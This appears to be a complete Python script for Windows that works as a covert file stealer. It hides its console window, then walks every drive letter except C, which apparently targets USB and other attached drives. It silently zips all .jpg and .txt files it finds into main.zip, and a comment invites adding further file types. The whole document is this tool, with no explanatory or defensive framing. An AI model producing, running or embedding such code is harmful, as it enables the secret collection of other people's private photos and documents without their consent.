import os
import win32gui
import win32con
from zipfile import ZipFile

def hide_cmd():
    win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)

def show_cmd():
    win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_SHOW)

def main():
    hide_cmd()

    drive_list = ['A', 'B', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']

    zipObj = ZipFile('main.zip', 'w')

    for drive in drive_list:
        extensions = {".jpg", ".txt"}  # Add other file types here
        try:
            for dirname, dirpaths, filenames in os.walk(f"{drive}:\\"):
                for filename in filenames:
                    ext = os.path.splitext(filename)[-1]
                    if ext in extensions:
                        x = os.path.join(dirname, filename)
                        zipObj.write(str(x))  # Add file to zip
        except:
            pass

    zipObj.close()
    show_cmd()

if __name__ == "__main__":
    main()